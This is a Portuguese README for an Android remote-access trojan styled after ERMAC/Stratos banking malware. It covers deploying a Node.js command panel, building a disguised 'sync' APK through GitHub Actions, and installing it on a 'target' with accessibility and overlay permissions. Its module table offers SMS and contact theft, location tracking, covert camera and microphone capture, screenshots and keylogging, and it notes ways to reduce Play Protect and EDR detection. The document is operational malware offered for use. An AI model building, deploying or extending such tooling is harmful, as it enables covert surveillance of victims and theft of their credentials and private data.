# RAT Panel + APK — ERMAC/Stratos style

## Estrutura
```
panel/          → painel Node.js (Render / Railway / VPS)
app/            → APK Android (Java, API 26-35)
.github/        → GitHub Actions builder
```

---

## 1. Painel (Render free tier)

### Variáveis de ambiente
| Var | Valor |
|---|---|
| `PANEL_PASS` | senha do login |
| `GH_TOKEN` | PAT GitHub — escopos `repo` + `actions:write` |
| `GH_REPO` | `usuario/repositorio` |
| `BUILD_TOKEN` | string aleatória (gerada automaticamente se ausente) |

### Deploy Render
1. New → Web Service → conecte o repositório
2. Root directory: `panel`
3. Build: `npm install`
4. Start: `npm start`
5. Adicione as env vars acima

---

## 2. Builder (GitHub Actions)

### Keystore
Gere uma vez localmente:
```bash
keytool -genkeypair -v \
  -keystore release.jks -alias kl \
  -keyalg RSA -keysize 2048 -validity 10000 \
  -storepass klpass123 -keypass klpass123 \
  -dname "CN=Sync, OU=Sync, O=Sync, L=SP, S=SP, C=BR"

base64 release.jks | tr -d '\n'
```
Cole o base64 como secret `KEYSTORE_B64` no repositório GitHub.

> Se `KEYSTORE_B64` estiver vazio, o workflow gera um novo keystore e o exibe no log — copie e salve.

### Wrapper Gradle
Gere o wrapper real (necessário antes do primeiro commit):
```bash
gradle wrapper --gradle-version 8.9
```
Commite `gradlew`, `gradlew.bat`, `gradle/wrapper/`.

### Disparar build
No painel, clique no ⚙ do rail → "build iniciado".  
APK disponível em `/apk` em ~6 minutos.

---

## 3. APK — instalação manual

1. Transfira `sync.apk` para o alvo
2. Instale (habilitar "fontes desconhecidas")
3. Abra → conceda todas as permissões
4. Toque em **Ativar serviço de sincronização** → habilite na lista de acessibilidade
5. Android 13+: Info do app → ⋮ → **Permitir configurações restritas** antes do toggle
6. Opcional: **Permitir exibição sobre outros apps** (overlay)
7. Desative otimização de bateria para o app

---

## 4. Módulos disponíveis

| Comando | Descrição |
|---|---|
| `info` | Perfil do dispositivo |
| `sms` | Últimas 80 SMS |
| `contacts` | Agenda completa |
| `apps` | Apps instalados |
| `files` | Lista diretório (arg = caminho) |
| `clip` | Conteúdo da área de transferência |
| `loc` | Última localização conhecida + link Maps |
| `cam` | Foto da câmera frontal (enviada como arquivo) |
| `mic` | Gravação de 10s (enviada como arquivo) |
| `screen` | Screenshot via acessibilidade (Android 11+) |
| `a11ytree` | Dump da árvore de UI |
| `keylog` | Flush do buffer de keystrokes |
| `lock` | Trava a tela |
| `toast` | Exibe mensagem (arg = texto) |
| `browser` | Abre URL (arg = url) |
| `redirect` | Alias de browser |

---

## 5. Limitações reais

- **Clipboard em background** — bloqueado no Android 10+ fora de IME/a11y
- **DoS / Mining** — stubs; plug lógica conforme necessidade
- **Campos bancários** — mascarados na árvore de acessibilidade (sem root)
- **Câmera** — usa `android.hardware.Camera` (deprecated mas funcional API 26+); Camera2 para builds futuros
- **Screenshot** — requer acessibilidade ativa + Android 11+
- **EDR/Play Protect** — assinatura válida + R8 reduzem alertas; unsigned hooks de keylogger são detectados por alguns EDRs
